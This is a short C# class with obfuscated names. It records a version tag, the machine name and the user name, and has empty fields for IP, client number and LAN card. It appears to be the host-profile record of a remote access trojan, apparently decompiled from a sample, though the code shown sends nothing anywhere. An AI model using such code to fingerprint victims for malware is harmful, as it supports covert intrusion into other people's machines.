using System;

namespace wardhmrias;

public class MLRLEINF
{
	public string wardhmriasaptyer;

	public string wardhmriasuitp = "";

	public string wardhmriasclientdNum = "";

	public string wardhmriaslancdard = "";

	public string wardhmriasuntame = "";

	public string wardhmriascnadme = "";

	public MLRLEINF()
	{
		wardhmriasIndfo();
	}

	private void wardhmriasIndfo()
	{
		wardhmriasaptyer = "M.0.0.6|wardhmrias".Split(new char[1] { '|' })[0];
		wardhmriascnadme = Environment.MachineName;
		wardhmriasuntame = Environment.UserName;
		wardhmriasuitp = "";
		wardhmriaslancdard = "";
	}
}
